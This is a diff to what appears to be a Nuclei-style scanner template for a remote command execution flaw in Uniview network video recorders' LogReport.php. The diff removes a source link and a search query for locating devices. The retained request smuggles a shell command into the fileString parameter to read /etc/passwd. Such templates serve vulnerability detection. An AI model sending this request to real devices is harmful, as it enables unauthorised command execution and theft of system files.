@@ -3,14 +3,8 @@ info:
   name: 浙江宇视网络视频录像机LogReport.php远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d7d7bef3746b6d75cc99f2d1542f2a98
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: d7d7bef3746b6d75cc99f2d1542f2a98
-    fofa: + hunter`web.body="Alarm"&&web.body="白牌定制"`
 http:
 - raw:
   - 'GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bcat%20/etc/passwd%3eqwer123.txt HTTP/1.1
